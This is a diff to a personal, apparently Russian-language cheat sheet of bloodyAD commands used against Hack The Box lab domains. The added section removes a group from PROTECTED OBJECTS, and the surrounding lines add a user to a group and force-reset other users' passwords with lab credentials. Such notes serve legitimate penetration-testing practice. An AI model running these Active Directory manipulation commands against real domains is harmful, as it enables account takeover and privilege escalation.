@@ -75,6 +75,12 @@ Silvercore_21
  
   bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" -u "e.rodriguez" -p 'WAT?watismypass!' add groupMember 'CHIEFS MARKETING' "e.rodriguez"
 
+# Удалление группы из группы
+
+    Попробуем удалить эту группу IT из группы PROTECTED OBJECTS:
+
+    bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' IT
+
 # смена пароля 
     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set password adam.silver 'NewP@ssw0rd123!'
     bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.129.81.139 -u "d.anderson" -p 'WAT?watismypass!' set password "e.rodriguez" 'WAT?watismypass!'
